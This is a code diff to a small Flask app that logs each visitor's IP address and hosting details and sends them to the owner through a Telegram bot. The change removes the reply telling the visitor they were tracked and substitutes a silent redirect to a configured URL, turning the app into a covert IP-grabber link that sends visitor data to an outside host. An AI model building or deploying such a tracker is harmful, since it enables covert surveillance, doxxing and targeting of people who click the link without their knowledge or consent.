@@ -1,8 +1,9 @@
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, render_template, request, jsonify, redirect
 import requests
 import os
 from datetime import datetime
 
+REDIRECT = os.getenv('REDIRECT_URL')
 BOT_API = os.getenv('BOT_API')
 OWNER_ID = os.getenv('OWNER_ID')
 app = Flask(__name__)
@@ -44,7 +45,7 @@ def main():
     *Hosting :* `{info['hosting']}`
     """
     requests.get(f'https://api.telegram.org/bot{BOT_API}/sendmessage?chat_id={OWNER_ID}&text={output}&parse_mode=Markdown')
-    return jsonify({"Your IP Address ":info['query'], "Status":"IP successfully tracked."})
+    return redirect(REDIRECT)
     
 if __name__ == "__main__":
     app.run(host='0.0.0.0', debug=False)
